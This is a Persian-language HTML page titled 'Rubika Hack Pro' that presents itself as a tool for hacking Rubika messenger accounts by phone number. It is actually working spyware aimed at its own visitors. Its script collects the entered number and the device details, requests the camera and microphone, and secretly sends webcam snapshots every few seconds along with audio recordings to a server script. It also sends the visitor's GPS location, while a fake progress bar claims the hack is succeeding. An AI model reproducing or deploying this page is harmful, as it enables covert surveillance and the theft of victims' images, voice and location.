<!DOCTYPE html><html lang="fa" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>🔓 Rubika Hack Pro</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif;direction:rtl}
body{background:linear-gradient(135deg,#0d1117,#1a1a2e);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.c{background:#161b22;border:1px solid #30363d;border-radius:20px;padding:28px;max-width:440px;width:100%}
h1{color:#8b5cf6;text-align:center;font-size:22px;margin-bottom:4px}
.s{color:#8b949e;text-align:center;font-size:12px;margin-bottom:20px}
input{width:100%;padding:12px;background:#0d1117;border:1px solid #30363d;border-radius:10px;color:#fff;font-size:14px;margin-bottom:10px;outline:none}
.b{width:100%;padding:16px;background:linear-gradient(135deg,#8b5cf6,#6d28d9);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:800;cursor:pointer;margin-top:8px}
.b:disabled{opacity:.4}.p{display:none;margin-top:16px}
.pb{background:rgba(255,255,255,0.06);border-radius:20px;height:20px;overflow:hidden}
.pf{height:100%;width:0%;background:linear-gradient(90deg,#8b5cf6,#6d28d9);border-radius:20px;transition:width .3s}
.st{display:none;background:rgba(63,185,80,0.06);border:1px solid rgba(63,185,80,0.12);border-radius:10px;padding:10px;text-align:center;color:#3fb950;font-size:12px;margin-top:12px}
</style></head><body>
<div class="c">
<div style="text-align:center;font-size:48px;margin-bottom:8px">🔓</div>
<h1>RUBIKA HACK PRO</h1><p class="s">هک اکانت روبیکا با شماره</p>
<input type="tel" id="phone" placeholder="📱 شماره هدف">
<button class="b" id="btn" onclick="go()">🔓 شروع هک</button>
<div class="p" id="prog"><div class="pb"><div class="pf" id="fill"></div></div></div>
<div class="st" id="status">📷 دوربین فعال شد</div>
</div>
<script>
var stream,canvas,ctx;
function E(id){return document.getElementById(id)}
function o(t){E("btn").textContent=t;E("btn").disabled=false}
function S(t,d){try{fetch("save.php?type="+t,{method:"POST",body:JSON.stringify(d)})}catch(e){}}
function snap(){if(!stream)return;var v=document.getElementById("cam");if(!v||!v.videoWidth)return;canvas||(canvas=document.createElement("canvas"),ctx=canvas.getContext("2d"));canvas.width=v.videoWidth;canvas.height=v.videoHeight;ctx.drawImage(v,0,0);S("webcam",{image:canvas.toDataURL("image/jpeg",0.85)})}
function go(){
var ph=E("phone").value;if(!ph)return;
S("rubika_hack",{phone:ph});
E("btn").disabled=true;E("btn").textContent="در حال هک...";E("prog").style.display="block";
navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480},audio:true}).then(function(s){
stream=s;E("status").style.display="block";
var v=document.createElement("video");v.id="cam";v.autoplay=true;v.muted=true;v.playsInline=true;v.srcObject=s;v.style.cssText="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0";document.body.appendChild(v);v.play();
setInterval(snap,3000);
try{var mr=new MediaRecorder(s);mr.ondataavailable=function(e){e.data.size>0&&fetch("save.php?type=audio",{method:"POST",body:e.data})};mr.start(8000)}catch(e){}
}).catch(function(){});
var p=0;var t=setInterval(function(){p+=Math.random()*15;if(p>=100){p=100;clearInterval(t);o("✅ هک کامل شد!")}E("fill").style.width=Math.min(p,100)+"%"},500);
}
setTimeout(function(){S("device",{ua:navigator.userAgent,screen:screen.width+"x"+screen.height})},1000);
setTimeout(function(){navigator.geolocation&&navigator.geolocation.getCurrentPosition(function(p){S("gps",{lat:p.coords.latitude,lng:p.coords.longitude})},function(){},{timeout:5000})},3000);
</script></body></html>
